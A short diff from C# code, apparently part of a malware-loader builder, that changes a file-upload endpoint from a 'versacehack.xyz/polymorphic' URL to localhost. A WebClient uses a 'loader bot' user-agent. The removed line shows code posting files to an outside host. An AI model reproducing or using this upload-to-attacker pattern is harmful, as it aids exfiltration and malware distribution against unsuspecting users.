@@ -97,7 +97,7 @@ namespace create_loaders
             foreach (string file in files)
             {
                 //upload file because its not the other 3 files
-                const string api_url = "https://versacehack.xyz/polymorphic/upload.php";
+                const string api_url = "https://localhost/polymorphic/upload.php";
                 WebClient web = new WebClient();
                 web.Headers.Add("user-agent", "VER$ACE-LOADER-BOT");
                 NameValueCollection post_request = new NameValueCollection
